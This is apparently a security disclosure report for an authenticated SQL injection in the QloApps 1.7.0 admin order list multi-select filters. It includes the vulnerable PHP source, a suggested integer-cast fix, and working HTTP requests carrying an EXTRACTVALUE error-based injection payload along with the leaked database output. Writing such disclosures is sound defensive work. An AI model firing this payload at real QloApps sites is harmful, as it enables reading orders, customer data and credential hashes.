### Vulnerability details

**Official website / Product:** https://qloapps.com

**Repository:** Qloapps/QloApps (stars at selection: 14456)

**Vulnerability type:** SQLi (back-office multi-select list filter → unquoted `IN()`)

**Vulnerability versions:** QloApps ≤ 1.7.0 (latest release tag v1.7.0); default branch develop (`3be9022`) still contains the same sink.

**Vulnerability URL / Parameter:** `POST /adminXXX/index.php?controller=AdminOrders` parameter `orderFilter_os!id_order_state` (JSON array or multi-select `[]`); likewise `orderFilter_a!id_currency`. Other admin list controllers that set `multiple=>true` with `operator` share the same sink (e.g. AdminProducts hotel/feature multi-selects).

**Complex:** yes

### Verification procedure

1. Install QloApps v1.7.0 via `webkul/qloapps_docker` on `127.0.0.1:18101`, overlaying tag-identical `AdminController.php` / `AdminOrdersController.php`.
2. Remove `/install`, rename the admin directory; log in as administrator.
3. Submit the AdminOrders status multi-select filter as JSON: `["1) AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"]`.
4. Follow the 302 list rebuild request; observe HTTP 500 and XPATH leakage in MySQL/Apache errors.

Vulnerability HTTP request:

```http
POST /admin909sbn7lv/index.php?controller=AdminOrders&token=<AdminOrdersToken> HTTP/1.1
Host: 127.0.0.1:18101
Cookie: QloApps-<cookie_key>=<admin_session>
Content-Type: application/x-www-form-urlencoded

token=<AdminOrdersToken>&submitFilterorder=1&orderFilter_os%21id_order_state=%5B%221)+AND+EXTRACTVALUE(1%2CCONCAT(0x7e%2CVERSION()))--+-%22%5D
```

Follow-up:

```http
GET /admin909sbn7lv/index.php?controller=AdminOrders&token=<AdminOrdersToken>&submitFilterorder=1 HTTP/1.1
Host: 127.0.0.1:18101
Cookie: QloApps-<cookie_key>=<admin_session>
```

Verification result:

List query raises PDOException: `SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~8.0.42-0ubuntu0.24.04.2'` (`VERSION()`). The currency multi-select path leaks `~root@localhost` (`USER()`). MySQL general log shows:

`WHERE 1 AND os.\`id_order_state\` IN (1) AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -)`

Evidence: `evidence/TMP-r1a1-1/` (`mysql-general-inject.log`, `apache-error-xpath.log`, `exploit-*.txt`).

### Vulnerability analysis

`AdminOrdersController` defines order status and currency filters as `type=select`, `multiple=true`, `operator=or`, **without** `validation => isUnsignedInt`.

`AdminController::processFilter()` only `json_decode`s multi-select values, then builds:

`IN ('.pSQL(implode(',', $value)).')'`

`pSQL` / `mysqli_real_escape_string` escapes quotes and backslashes only; it does not stop breakout from an unquoted numeric `IN ()` context such as `) AND EXTRACTVALUE(...--`. Filters are stored in the admin cookie; list rendering `getList()` → `Db::executeS()` runs the concatenated SQL, enabling error-/boolean-/UNION-based injection and full database read (orders, customers, credential hashes, etc.).

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: controllers/admin/AdminOrdersController.php
# Lines: 245-253, 275-285 (v1.7.0)
'id_currency' => array(
    'title' => $this->l('Order Currency'),
    'type' => 'select',
    'multiple' => true,
    'operator' => 'or',
    'filter_key' => 'a!id_currency',
    'list' => $this->orderCurrenciesArray,
    'displayed' => false,
),
'osname' => array(
    'title' => $this->l('Status'),
    'type' => 'select',
    'multiple' => true,
    'operator' => 'or',
    'list' => $this->statuses_array,
    'filter_key' => 'os!id_order_state',
    // no validation / intval
),
```

```php
# File: classes/controller/AdminController.php
# Lines: 1043-1049 (v1.7.0); develop ~1059-1062 same sink
if (is_array($value)) {
    if ($type == 'select' && (isset($field['multiple']) && $field['multiple']) && isset($field['operator'])) {
        if ($field['operator'] == 'and') {
            $sql_filter .= ' AND '.pSQL($key).' IN ('.pSQL(implode(',', $value)).')';
            $this->_filterHaving .= ' AND COUNT(DISTINCT '.pSQL($key).') = '.(int) count($value);
        } elseif ($field['operator'] == 'or') {
            $sql_filter .= ' AND '.pSQL($key).' IN ('.pSQL(implode(',', $value)).')';
        }
```

### Vulnerability Fix

Cast every multi-select id with `(int)` / `array_map('intval', $value)` before building `IN (...)`, or use bound parameters. Do not place `pSQL(implode(...))` into an unquoted `IN()` list. Optionally declare `validation => isUnsignedInt` and validate each array element (mirroring existing range-filter checks).
